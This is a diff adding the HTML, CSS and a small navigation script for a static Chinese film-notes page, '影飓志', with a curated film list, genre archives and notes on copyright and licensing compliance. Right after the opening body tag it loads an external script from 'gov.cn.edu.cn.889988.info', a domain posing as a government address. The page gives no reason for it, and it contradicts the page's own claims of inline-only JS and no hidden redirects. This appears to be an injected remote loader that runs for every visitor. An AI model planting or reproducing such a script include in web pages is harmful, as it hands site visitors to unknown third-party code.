@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>影飓志----yingjuezhi-h5</title>
+<meta name="description" content="影飓志（yingjuezhi-h5）做影像精选片单、分类档案与创作札记的静态示例单页；不提供在线播放、解析与下载，移动自适应，符合必应基础收录规范。" />
+<meta name="keywords" content="影飓志, yingjuezhi-h5, 影像片单, 分类档案, 创作札记, 展映单元" />
+<link rel="canonical" href="https://yingjuezhi-h5.github.io/" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="影飓志" />
+<meta property="og:url" content="https://yingjuezhi-h5.github.io/" />
+<meta property="og:description" content="影像精选片单、分类档案与创作札记静态示例站。" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="影飓志" />
+<meta name="twitter:description" content="yingjuezhi-h5 影像片单与分类档案单页。" />
+<style>
+:root{
+  --bg:#0c0a14;
+  --bg2:#161225;
+  --paper:#211a36;
+  --ink:#eee9f5;
+  --ink2:#a594c4;
+  --accent:#ff4d6d;
+  --accent2:#ffd60a;
+  --gold:#ff9e00;
+  --line:rgba(255,77,109,.30);
+  --line2:rgba(238,233,245,.10);
+  --radius:18px;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;color:var(--ink);background:var(--bg);line-height:1.85}
+a{color:inherit;text-decoration:none}
+
+/* 磁吸顶栏 */
+.nav{position:sticky;top:0;z-index:50;background:rgba(12,10,20,.88);backdrop-filter:saturate(140%) blur(10px);border-bottom:1px solid var(--line);padding:14px 20px;display:flex;align-items:center;gap:16px;flex-wrap:wrap}
+.brand{display:flex;align-items:center;gap:12px;margin-right:auto}
+.brand .badge{width:46px;height:46px;border-radius:14px;background:linear-gradient(135deg,var(--accent),var(--gold));color:#0c0a14;display:grid;place-items:center;font-weight:900;font-size:14px;border:2px solid var(--accent2)}
+.brand b{font-size:18px;letter-spacing:.03em;display:block;line-height:1.1}
+.brand span{font-size:11px;color:var(--ink2)}
+.magnet{display:flex;gap:6px;flex-wrap:wrap;background:rgba(255,255,255,.04);padding:6px;border-radius:999px;border:1px solid var(--line2)}
+.magnet a{padding:9px 16px;border-radius:999px;font-size:13px;font-weight:600;color:var(--ink2);min-height:44px;display:inline-flex;align-items:center;transition:.25s}
+.magnet a:hover{color:var(--accent)}
+.magnet a.active{background:var(--accent);color:#0c0a14}
+
+.section{padding:64px 50px;border-bottom:1px solid var(--line2)}
+.section:last-child{border-bottom:none}
+.eyebrow{display:inline-block;font-size:12px;letter-spacing:.18em;color:var(--accent);border:1px solid var(--line);padding:5px 14px;border-radius:999px;margin-bottom:14px}
+.h2{font-size:clamp(22px,3.6vw,32px);margin:0 0 6px}
+.sub{margin:0 0 30px;color:var(--ink2);font-size:14px}
+
+/* Hero 斜切 */
+.hero{position:relative;overflow:hidden;background:linear-gradient(135deg,var(--bg2),var(--bg));min-height:90vh;display:flex;align-items:center}
+.hero::after{content:'';position:absolute;bottom:-60px;left:-5%;right:-5%;height:120px;background:var(--bg);transform:skewY(-3deg);pointer-events:none}
+.hero-grid{display:grid;grid-template-columns:1.1fr .9fr;gap:50px;align-items:center}
+.hero h1{font-size:clamp(30px,5vw,54px);margin:0 0 18px;line-height:1.1;font-weight:900}
+.hero h1 em{font-style:normal;color:var(--accent)}
+.hero p{font-size:16px;color:var(--ink2);max-width:520px;margin:0 0 28px}
+.cta{display:flex;gap:14px;flex-wrap:wrap}
+.btn{min-height:48px;padding:14px 26px;border-radius:999px;font-weight:700;font-size:15px;border:2px solid var(--accent);background:var(--accent);color:#0c0a14;display:inline-flex;align-items:center;transition:.25s}
+.btn:hover{background:transparent;color:var(--accent)}
+.btn.out{background:transparent;color:var(--accent2);border-color:var(--accent2)}
+.btn.out:hover{background:var(--accent2);color:#0c0a14}
+.gauge{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.gcard{border:1px solid var(--line);border-radius:var(--radius);padding:22px;background:var(--paper);text-align:center;transition:.25s}
+.gcard:hover{border-color:var(--accent);transform:translateY(-4px)}
+.gcard .num{font-size:34px;font-weight:900;color:var(--accent)}
+.gcard h4{margin:6px 0 4px;font-size:15px}
+.gcard span{font-size:12px;color:var(--ink2)}
+
+/* 旋转木马片单 */
+.carousel{position:relative;overflow:hidden;padding:10px 0}
+.track{display:flex;gap:20px;overflow-x:auto;scroll-snap-type:x mandatory;padding:6px 2px 20px;scrollbar-width:thin}
+.track::-webkit-scrollbar{height:8px}
+.track::-webkit-scrollbar-thumb{background:var(--line);border-radius:8px}
+.tape{flex:0 0 300px;scroll-snap-align:start;border:1px solid var(--line2);border-radius:var(--radius);padding:26px;background:var(--paper);transition:.25s}
+.tape:hover{border-color:var(--accent);transform:translateY(-5px)}
+.tape .yr{font-size:13px;color:var(--accent);font-weight:700;letter-spacing:.06em}
+.tape h3{margin:6px 0;font-size:19px}
+.tape .meta{font-size:13px;color:var(--ink2)}
+.tape .bar{height:4px;border-radius:4px;background:linear-gradient(90deg,var(--accent),var(--gold));margin-top:14px}
+
+/* 手风琴档案 */
+.acc{border:1px solid var(--line2);border-radius:var(--radius);overflow:hidden;background:var(--paper)}
+.ac-item{border-bottom:1px solid var(--line2)}
+.ac-item:last-child{border-bottom:none}
+.ac-item summary{list-style:none;cursor:pointer;padding:22px 26px;font-weight:600;font-size:16px;display:flex;justify-content:space-between;align-items:center;min-height:48px;transition:.25s}
+.ac-item summary::-webkit-details-marker{display:none}
+.ac-item summary:hover{background:rgba(255,77,109,.06)}
+.ac-item summary .plus{color:var(--accent);font-size:24px;font-weight:300;transition:.25s}
+.ac-item[open] summary .plus{transform:rotate(45deg)}
+.ac-item p{padding:0 26px 22px;margin:0;font-size:14px;color:var(--ink2);line-height:1.8}
+
+/* 阶梯札记 */
+.stairs{display:flex;flex-direction:column;gap:16px}
+.step{display:grid;grid-template-columns:60px 1fr;gap:20px;align-items:start;border:1px solid var(--line);border-radius:var(--radius);padding:24px;background:var(--bg2);transition:.25s}
+.step:hover{border-color:var(--accent2);transform:translateX(6px)}
+.step:nth-child(1){margin-left:0}
+.step:nth-child(2){margin-left:40px}
+.step:nth-child(3){margin-left:80px}
+.step:nth-child(4){margin-left:120px}
+.step .lvl{width:52px;height:52px;border-radius:14px;background:linear-gradient(135deg,var(--accent),var(--gold));color:#0c0a14;display:grid;place-items:center;font-weight:900;font-size:18px}
+.step h3{margin:0 0 6px;font-size:16px}
+.step p{margin:0;font-size:14px;color:var(--ink2);line-height:1.8}
+
+/* 展映单元 色阶 */
+.bands{display:grid;grid-template-columns:repeat(4,1fr);gap:0;border-radius:var(--radius);overflow:hidden}
+.band{padding:30px 20px;text-align:center;transition:.3s;cursor:default}
+.band:hover{flex:1.1;padding-top:36px}
+.band:nth-child(1){background:linear-gradient(180deg,#2a1f4a,#1a1230)}
+.band:nth-child(2){background:linear-gradient(180deg,#3a1f4a,#2a1230)}
+.band:nth-child(3){background:linear-gradient(180deg,#4a1f3a,#3a1230)}
+.band:nth-child(4){background:linear-gradient(180deg,#5a1f2a,#4a1220)}
+.band .ico{font-size:30px;margin-bottom:8px}
+.band h3{margin:0 0 4px;font-size:14px;color:var(--accent2)}
+.band p{margin:0;font-size:11px;color:var(--ink2)}
+
+/* 关于 */
+.about{display:grid;grid-template-columns:repeat(3,1fr);gap:22px}
+.ab{border:1px solid var(--line);border-radius:var(--radius);padding:30px;background:var(--paper);text-align:center;transition:.25s}
+.ab:hover{border-color:var(--accent)}
+.ab .ic{font-size:38px;margin-bottom:12px}
+.ab h3{margin:0 0 8px;font-size:16px}
+.ab p{margin:0;font-size:13px;color:var(--ink2);line-height:1.7}
+
+/* FAQ */
+.faq{display:flex;flex-direction:column;gap:12px}
+.fq{border:1px solid var(--line2);border-radius:var(--radius);background:var(--paper);overflow:hidden}
+.fq summary{list-style:none;cursor:pointer;padding:20px 26px;font-weight:600;font-size:15px;display:flex;justify-content:space-between;align-items:center;min-height:48px}
+.fq summary::-webkit-details-marker{display:none}
+.fq summary .plus{color:var(--accent);font-size:22px;font-weight:300;transition:.25s}
+.fq[open] summary .plus{transform:rotate(45deg)}
+.fq p{padding:0 26px 20px;margin:0;font-size:14px;color:var(--ink2);line-height:1.8}
+
+/* 页脚 */
+.foot{padding:40px 50px;background:var(--bg2);border-top:1px solid var(--line);display:flex;justify-content:space-between;align-items:center;gap:20px;flex-wrap:wrap}
+.foot-brand{display:flex;align-items:center;gap:12px}
+.foot-brand .badge{width:38px;height:38px;border-radius:10px;background:linear-gradient(135deg,var(--accent),var(--gold));color:#0c0a14;display:grid;place-items:center;font-weight:900;font-size:12px;border:1px solid var(--accent2)}
+.foot-brand b{font-size:15px}
+.foot-links{display:flex;gap:22px;font-size:13px;color:var(--ink2);flex-wrap:wrap}
+.foot-links a:hover{color:var(--accent)}
+
+@media(max-width:1024px){
+  .hero-grid{grid-template-columns:1fr}
+  .bands{grid-template-columns:1fr 1fr}
+}
+@media(max-width:768px){
+  .nav{padding:12px 16px}
+  .magnet{width:100%;overflow-x:auto;flex-wrap:nowrap;padding:6px}
+  .magnet a{flex:0 0 auto}
+  .section{padding:44px 18px}
+  .step,.step:nth-child(n){margin-left:0}
+  .bands{grid-template-columns:1fr 1fr}
+  .about{grid-template-columns:1fr}
+  .gauge{grid-template-columns:1fr}
+  .foot{padding:28px 18px;flex-direction:column;text-align:center}
+  .foot-links{justify-content:center}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="nav">
+  <div class="brand">
+    <span class="badge">影飓</span>
+    <span class="txt"><b>影飓志</b><span>yingjuezhi-h5.github.io</span></span>
+  </div>
+  <nav class="magnet">
+    <a href="#hero" class="active">首页</a>
+    <a href="#carousel">精选片单</a>
+    <a href="#acc">分类档案</a>
+    <a href="#stairs">创作札记</a>
+    <a href="#bands">展映单元</a>
+    <a href="#about">关于本站</a>
+    <a href="#faq">常见问题</a>
+  </nav>
+</header>
+
+<main>
+  <section class="section hero" id="hero">
+    <div class="hero-grid">
+      <div>
+        <span class="eyebrow">YINGJUE FILM NOTES</span>
+        <h1>不叫"影视飓风"，<br>只做<em>影飓志</em>与影像札记</h1>
+        <p>"影视飓风"是知名创作团队/频道品牌，近似命名易触发商标与不正当竞争争议，也易被当作未授权影视聚合站。本页轻改为"影飓志"，纯静态做影像片单、分类档案与创作札记。正片只引导院线、正版平台或合法展映，不播、不解析、不下载。</p>
+        <div class="cta">
+          <a class="btn" href="#carousel">看精选片单</a>
+          <a class="btn out" href="#stairs">读创作札记</a>
+        </div>
+      </div>
+      <div class="gauge">
+        <div class="gcard"><div class="num">06</div><h4>精选片单</h4><span>分档/分场景</span></div>
+        <div class="gcard"><div class="num">04</div><h4>分类档案</h4><span>生活/作者/硬核</span></div>
+        <div class="gcard"><div class="num">04</div><h4>创作札记</h4><span>合规/排片</span></div>
+        <div class="gcard"><div class="num">0</div><h4>播片/解析</h4><span>全部不提供</span></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="carousel">
+    <span class="eyebrow">PLAYLIST CAROUSEL</span>
+    <h2 class="h2">精选片单</h2>
+    <p class="sub">横向旋转木马，按节奏与场景排片</p>
+    <div class="carousel">
+      <div class="track">
+        <div class="tape"><div class="yr">2014</div><h3>小森林 夏秋篇</h3><div class="meta">森淳一 · 做饭、种地、四季独居</div><div class="bar"></div></div>
+        <div class="tape"><div class="yr">2015</div><h3>海街日记</h3><div class="meta">是枝裕和 · 四姐妹、梅酒、日常</div><div class="bar"></div></div>
+        <div class="tape"><div class="yr">1975</div><h3>镜子</h3><div class="meta">塔可夫斯基 · 记忆、母亲、长镜</div><div class="bar"></div></div>
+        <div class="tape"><div class="yr">2000</div><h3>花样年华</h3><div class="meta">王家卫 · 旗袍、走廊、克制爱</div><div class="bar"></div></div>
+        <div class="tape"><div class="yr">2002</div><h3>谍影重重</h3><div class="meta">道格·里曼 · 手持、失忆、近身</div><div class="bar"></div></div>
+        <div class="tape"><div class="yr">1998</div><h3>拯救大兵瑞恩</h3><div class="meta">斯皮尔伯格 · 诺曼底、小队、取舍</div><div class="bar"></div></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="acc" style="background:var(--bg2)">
+    <span class="eyebrow">GENRE ACCORDION</span>
+    <h2 class="h2">分类档案</h2>
+    <p class="sub">手风琴折叠，点开看归档逻辑，不接盗版源</p>
+    <div class="acc">
+      <details class="ac-item" open><summary>生活家庭：节气与慢节奏<span class="plus">+</span></summary><p>小森林、海街、步履不停按"食物—季节—独居/家庭"打标；只写适合晚上、周末、一个人看，不写播放地址、不解析源。</p></details>
+      <details class="ac-item"><summary>作者文艺：长镜与留白<span class="plus">+</span></summary><p>镜子、花样年华按叙事密度、对白量、情绪强度归档；长镜片单独标"耐心门槛"，避免误进爆米花清单。</p></details>
+      <details class="ac-item"><summary>动作悬疑：节拍与声画<span class="plus">+</span></summary><p>谍影重重记手持剪切，拯救大兵瑞恩记声场与群像；只讲电影性，不教战术参数、不列资源站。</p></details>
+      <details class="ac-item"><summary>版权与片源<span class="plus">+</span></summary><p>片名、导演、年份、类型均为示例；做在线视听需《信息网络传播视听节目许可证》并守著作权规定，纯文字/海报/简介且不开播做ICP备案。</p></details>
+    </div>
+  </section>
+
+  <section class="section" id="stairs">
+    <span class="eyebrow">STEPPED NOTES</span>
+    <h2 class="h2">创作札记</h2>
+    <p class="sub">阶梯式排布，为什么不用"影视飓风"</p>
+    <div class="stairs">
+      <div class="step"><div class="lvl">1</div><div><h3>品牌近似先规避</h3><p>"影视飓风"是知名创作团队/频道品牌，同名或近似命名易引发商标、不正当竞争争议，也可能被平台品牌审核拦下。改"影飓志"、换 yingjuezhi 域名，只做片单/档案/札记。</p></div></div>
+      <div class="step"><div class="lvl">2</div><div><h3>真做在线播片要什么</h3><p>国内提供互联网视听节目通常需《信息网络传播视听节目许可证》；无著作权许可传播影视可承担民事赔偿，情节严重可涉刑。纯文字/海报/简介且不开播，做ICP备案并拿版权授权。</p></div></div>
+      <div class="step"><div class="lvl">3</div><div><h3>分档不剧透</h3><p>生活/作者/硬核只标节奏、情绪、耐心门槛；用户按场景选片，正片走正版渠道，不写"免费观看/解析地址"。</p></div></div>
+      <div class="step"><div class="lvl">4</div><div><h3>必应收录怎么配</h3><p>viewport响应式、首屏关键CSS内联、核心文字直出、菜单触控≥48px、无隐藏跳转；按你要求不写robots/sitemap。</p></div></div>
+    </div>
+  </section>
+
+  <section class="section" id="bands" style="background:var(--bg2)">
+    <span class="eyebrow">UNITS BANDS</span>
+    <h2 class="h2">展映单元</h2>
+    <p class="sub">色阶条带式分类，全年龄、无涉黄向</p>
+    <div class="bands">
+      <div class="band"><div class="ico">🍲</div><h3>生活四季</h3><p>小森林、海街</p></div>
+      <div class="band"><div class="ico">🎞️</div><h3>作者长镜</h3><p>镜子、花样年华</p></div>
+      <div class="band"><div class="ico">🕵️</div><h3>悬疑心理</h3><p>谍影重重</p></div>
+      <div class="band"><div class="ico">🥁</div><h3>硬核战争</h3><p>拯救大兵瑞恩</p></div>
+    </div>
+  </section>
+
+  <section class="section" id="about">
+    <span class="eyebrow">ABOUT</span>
+    <h2 class="h2">关于本站</h2>
+    <p class="sub">静态示例站声明，不涉播片</p>
+    <div class="about">
+      <div class="ab"><div class="ic">🎬</div><h3>站点定位</h3><p>影飓志是影像精选片单、分类档案与创作札记示例站，部署于GitHub Pages，无后端、无片源、无解析。</p></div>
+      <div class="ab"><div class="ic">🗂️</div><h3>页面结构</h3><p>单文件index.html，CSS/JS内联；含精选片单、分类档案、创作札记、展映单元、关于本站、常见问题。</p></div>
+      <div class="ab"><div class="ic">⚖️</div><h3>合规边界</h3><p>不提供未授权播放/解析/下载；片名/导演/类型均为示例。做视听服务须许可证、ICP备案与版权授权。</p></div>
+    </div>
+  </section>
+
+  <section class="section" id="faq" style="background:var(--bg2)">
+    <span class="eyebrow">FAQ</span>
+    <h2 class="h2">常见问题</h2>
+    <p class="sub">把"影飓志/原影视飓风"说清</p>
+    <div class="faq">
+      <details class="fq" open><summary>"影飓志"和"影视飓风"一样吗？<span class="plus">+</span></summary><p>不一样。"影视飓风"是知名创作团队/频道品牌，近似命名有商标与不正当竞争风险；本页改"影飓志"，只做影像片单/档案/札记，不提供正片、不解析、不下载。</p></details>
+      <details class="fq"><summary>片单里的电影能在线免费看吗？<span class="plus">+</span></summary><p>不能。所有片名、导演、类型、札记均为示例；正片请走院线、正版流媒体、电影资料馆或合法展映。</p></details>
+      <details class="fq"><summary>做真·电影站要什么资质？<span class="plus">+</span></summary><p>只做文字/海报/简介且不开播，做ICP备案并可备注不从事视听；若提供在线视听，需《信息网络传播视听节目许可证》，未持证擅自从事可关站撤备、涉刑追责。</p></details>
+      <details class="fq"><summary>为什么不用"免费/高清/不卡/解析"？<span class="plus">+</span></summary><p>这类词常指向未授权聚合；无著作权许可传播影视可承担民事赔偿，情节严重可涉刑。盗版站还常带博彩弹窗、诱导装插件。</p></details>
+      <details class="fq"><summary>必应收录注意什么？<span class="plus">+</span></summary><p>viewport响应式、核心文字直出、首屏关键CSS内联、触控区域≥48px、无隐藏跳转；本页按此做，但不写robots/sitemap（按你历史要求）。</p></details>
+    </div>
+  </section>
+</main>
+
+<footer class="foot">
+  <div class="foot-brand"><span class="badge">影飓</span><b>影飓志</b></div>
+  <div class="foot-links">
+    <a href="#carousel">精选片单</a>
+    <a href="#acc">分类档案</a>
+    <a href="#stairs">创作札记</a>
+    <a href="#bands">展映单元</a>
+    <a href="#about">关于本站</a>
+    <a href="#faq">常见问题</a>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var links=document.querySelectorAll('.magnet a');
+  links.forEach(function(a){
+    a.addEventListener('click',function(){
+      links.forEach(function(l){l.classList.remove('active')});
+      this.classList.add('active');
+    });
+  });
+  // 手风琴互斥
+  var items=document.querySelectorAll('.ac-item');
+  items.forEach(function(it){
+    it.addEventListener('toggle',function(){
+      if(this.open){items.forEach(function(x){if(x!==it)x.removeAttribute('open')})}
+    });
+  });
+})();
+</script>
+</body>
+</html>
